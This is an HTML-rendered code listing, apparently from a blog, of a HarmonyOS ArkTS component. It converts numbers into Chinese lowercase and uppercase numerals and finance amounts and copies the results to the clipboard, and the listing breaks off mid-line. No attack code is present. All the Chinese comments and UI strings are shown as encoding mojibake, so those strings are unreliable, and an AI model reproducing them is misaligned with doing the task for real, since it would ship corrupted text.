@nutpi/chinese-number-format</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¼å…¥å¿…è¦çš„æ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// ç”¨äºæ˜¾ç¤ºæç¤ºä¿¡æ¯</span></span><br><span class="line"><span class="keyword">import</span> &#123; pasteboard &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>; <span class="comment">// ç”¨äºå¤„ç†å‰ªè´´æ¿æ“ä½œ</span></span><br><span class="line"><span class="keyword">import</span> &#123; toChineseNumber &#125; <span class="keyword">from</span> <span class="string">&#x27;@nutpi/chinese-finance-number&#x27;</span>; <span class="comment">// å°†æ•°å­—è½¬æ¢ä¸ºä¸­æ–‡å¤§å†™é‡‘é¢</span></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  toChineseWithUnits, <span class="comment">// å°†æ•°å­—è½¬æ¢ä¸ºå¸¦å•ä½çš„ä¸­æ–‡</span></span><br><span class="line">  toUpperCase, <span class="comment">// å°†ä¸­æ–‡å°å†™è½¬æ¢ä¸ºå¤§å†™</span></span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nutpi/chinese-number-format&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span> <span class="comment">// æ ‡è®°æ­¤ç»„ä»¶ä¸ºå…¥å£ç‚¹</span></span><br><span class="line">@<span class="title class_">Component</span> <span class="comment">// å®šä¹‰ä¸€ä¸ªç»„ä»¶</span></span><br><span class="line">struct <span class="title class_">NumberToChineseConverter</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">exampleNumber</span>: number = <span class="number">88.8</span>; <span class="comment">// ç¤ºä¾‹æ•°å­—</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">textColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>; <span class="comment">// æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">lineColor</span>: string = <span class="string">&quot;#d5d5d5&quot;</span>; <span class="comment">// åˆ†å‰²çº¿é¢œè‰²</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">basePadding</span>: number = <span class="number">30</span>; <span class="comment">// åŸºç¡€å†…è¾¹è·</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">chineseLowercase</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// è½¬æ¢åçš„å°å†™ä¸­æ–‡</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">chineseUppercase</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// è½¬æ¢åçš„ä¸­æ–‡å¤§å†™</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">chineseUppercaseAmount</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// è½¬æ¢åçš„ä¸­æ–‡å¤§å†™é‡‘é¢</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;inputChanged&#x27;</span>) private <span class="attr">inputText</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// ç›‘å¬è¾“å…¥æ–‡æœ¬å˜åŒ–</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å½“è¾“å…¥æ–‡æœ¬æ”¹å˜æ—¶è§¦å‘çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">inputChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chineseLowercase</span> = <span class="title function_">toChineseWithUnits</span>(<span class="title class_">Number</span>(<span class="variable language_">this</span>.<span class="property">inputText</span>), <span class="string">&#x27;zh-CN&#x27;</span>); <span class="comment">// è½¬æ¢ä¸ºå°å†™ä¸­æ–‡å¹¶å¸¦ä¸Šå•ä½</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chineseUppercase</span> = <span class="title function_">toUpperCase</span>(<span class="variable language_">this</span>.<span class="property">chineseLowercase</span>, <span class="string">&#x27;zh-CN&#x27;</span>); <span class="comment">// å°†å°å†™ä¸­æ–‡è½¬æ¢ä¸ºå¤§å†™</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chineseUppercaseAmount</span> = <span class="title function_">toChineseNumber</span>(<span class="title class_">Number</span>(<span class="variable language_">this</span>.<span class="property">inputText</span>)); <span class="comment">// è½¬æ¢ä¸ºå¤§å†™é‡‘é¢</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¤åˆ¶æ–‡æœ¬åˆ°å‰ªè´´æ¿çš„æ–¹æ³•</span></span><br><span class="line">  private <span class="title function_">copyToClipboard</span>(<span class="attr">text</span>: string): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> pasteboardData = pasteboard.<span class="title function_">createData</span>(pasteboard.<span class="property">MIMETYPE_TEXT_PLAIN</span>, text); <span class="comment">// åˆ›å»ºå‰ªè´´æ¿æ•°æ®</span></span><br><span class="line">    <span class="keyword">const</span> systemPasteboard = pasteboard.<span class="title function_">getSystemPasteboard</span>(); <span class="comment">// è·å–ç³»ç»Ÿå‰ªè´´æ¿</span></span><br><span class="line">    systemPasteboard.<span class="title function_">setData</span>(pasteboardData); <span class="comment">// è®¾ç½®å‰ªè´´æ¿æ•°æ®</span></span><br><span class="line">    promptAction.<span class="title function_">showToast</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;å·²å¤åˆ¶&#x27;</span> &#125;); <span class="comment">// æ˜¾ç¤ºå¤åˆ¶æˆåŠŸçš„æç¤º</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºç”¨æˆ·ç•Œé¢çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// ä¸»åˆ—å®¹å™¨</span></span><br><span class="line">      <span class="comment">// é¡µé¢æ ‡é¢˜</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;æ•°å­—è½¬ä¸­æ–‡å¤§å°å†™&#x27;</span>)</span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// æ–‡æœ¬å±…ä¸­å¯¹é½</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">shadow</span>(&#123; <span class="comment">// æ·»åŠ é˜´å½±æ•ˆæœ</span></span><br><span class="line">          <span class="attr">radius</span>: <span class="number">2</span>, <span class="comment">// é˜´å½±åŠå¾„</span></span><br><span class="line">          <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// é˜´å½±é¢œè‰²</span></span><br><span class="line">          <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// Xè½´åç§»é‡</span></span><br><span class="line">          <span class="attr">offsetY</span>: <span class="number">5</span> <span class="comment">// Yè½´åç§»é‡</span></span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Scroll</span>() &#123; <span class="comment">// æ»šåŠ¨è§†å›¾</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123; <span class="comment">// å†…éƒ¨åˆ—å®¹å™¨</span></span><br><span class="line">          <span class="comment">// å·¥å…·ä»‹ç»éƒ¨åˆ†</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">&#x27;å·¥å…·ä»‹ç»&#x27;</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontWeight</span>(<span class="number">600</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>); <span class="comment">// è®¾ç½®ä»‹ç»æ–‡å­—æ ·å¼</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">&#x27;å°†æ•°å­—è½¬æ¢ä¸ºä¸­æ–‡æ ¼å¼ï¼Œé€‚ç”¨äºç¥¨æ®å¡«å†™ã€åˆåŒæ–‡ä¹¦ã€è´¢åŠ¡æŠ¥è¡¨ç­‰å¤šç§åœºæ™¯ã€‚æ”¯æŒä»æœ€å°å•ä½â€œåˆ†â€åˆ°æœ€å¤§å•ä½â€œåƒå…†â€çš„æ•°å­—è½¬æ¢ã€‚&#x27;</span>)</span><br><span class="line">              .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">JUSTIFY</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span> &#125;); <span class="comment">// è®¾ç½®ä»‹ç»è¯¦æƒ…æ–‡å­—æ ·å¼</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>) <span class="comment">// å¯¹é½æ–¹å¼</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// è®¾ç½®å¤–è¾¹è·</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// æ·»åŠ é˜´å½±æ•ˆæœ</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>, <span class="comment">// é˜´å½±åŠå¾„</span></span><br><span class="line">            <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// é˜´å½±é¢œè‰²</span></span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// Xè½´åç§»é‡</span></span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">0</span> <span class="comment">// Yè½´åç§»é‡</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// è¾“å…¥åŒº</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123; <span class="comment">// è¡Œå®¹å™¨</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;ç¤ºä¾‹&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="string">&quot;#5871ce&quot;</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f2f1fd&quot;</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// è®¾ç½®ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">inputText</span> = <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.exampleNumber&#125;</span>`</span>; <span class="comment">// è®¾ç½®è¾“å…¥æ¡†æ–‡æœ¬ä¸ºç¤ºä¾‹æ•°å­—</span></span><br><span class="line">                &#125;);</span><br><span class="line">              <span class="title class_">Blank</span>(); <span class="comment">// å ä½ç¬¦</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;æ¸…ç©º&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="string">&quot;#e48742&quot;</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// è®¾ç½®ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#ffefe6&quot;</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">inputText</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// æ¸…ç©ºè¾“å…¥æ¡†</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">height</span>(<span class="number">45</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            <span class="title class_">Divider</span>().<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">5</span>, <span class="attr">bottom</span>: <span class="number">5</span> &#125;); <span class="comment">// åˆ†å‰²çº¿</span></span><br><span class="line">            <span class="title class_">TextInput</span>(&#123; <span class="attr">text</span>: $$this.<span class="property">inputText</span>, <span class="attr">placeholder</span>: <span class="string">`è¯·è¾“å…¥æ•°å­—ï¼Œä¾‹å¦‚ï¼š<span class="subst">$&#123;<span class="variable language_">this</span>.exampleNumber&#125;</span>`</span> &#125;) <span class="comment">// è¾“å…¥æ¡†</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">              .<span class="title function_">caretColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// è®¾ç½®å…‰æ ‡é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// è®¾ç½®å¤–è¾¹è·</span></span><br><span class="line">              .<span class="title function_">padding</span>(<span class="number">0</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">              .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">borderRadius</span>(<span class="number">0</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">              .<span class="title function_">type</span>(<span class="title class_">InputType</span>.<span class="property">NUMBER_DECIMAL</span>); <span class="comment">// è®¾ç½®è¾“å…¥ç±»å‹ä¸ºæ•°å­—</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>) <span class="comment">// å¯¹é½æ–¹å¼</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// è®¾ç½®å¤–è¾¹è·</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// æ·»åŠ é˜´å½±æ•ˆæœ</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>, <span class="comment">// é˜´å½±åŠå¾„</span></span><br><span class="line">            <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// é˜´å½±é¢œè‰²</span></span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// Xè½´åç§»é‡</span></span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">0</span> <span class="comment">// Yè½´åç§»é‡</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// ç»“æœåŒº</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`å°å†™ï¼š<span class="subst">$&#123;<span class="variable language_">this</span>.chineseLowercase&#125;</span>`</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// æ˜¾ç¤ºå°å†™ç»“æœ</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;å¤åˆ¶&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0052d9&quot;</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// è®¾ç½®ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">chineseLowercase</span>); <span class="comment">// å¤åˆ¶å°å†™ç»“æœåˆ°å‰ªè´´æ¿</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="number">45</span> &#125;) <span class="comment">// æœ€å°é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            <span class="title class_">Divider</span>().<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">5</span>, <span class="attr">bottom</span>: <span class="number">5</span> &#125;); <span class="comment">// åˆ†å‰²çº¿</span></span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`å¤§å†™ï¼š<span class="subst">$&#123;<span class="variable language_">this</span>.chineseUppercase&#125;</span>`</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// æ˜¾ç¤ºå¤§å†™ç»“æœ</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;å¤åˆ¶&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0052d9&quot;</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// è®¾ç½®ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">chineseUppercase</span>); <span class="comment">// å¤åˆ¶å¤§å†™ç»“æœåˆ°å‰ªè´´æ¿</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="number">45</span> &#125;) <span class="comment">// æœ€å°é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// 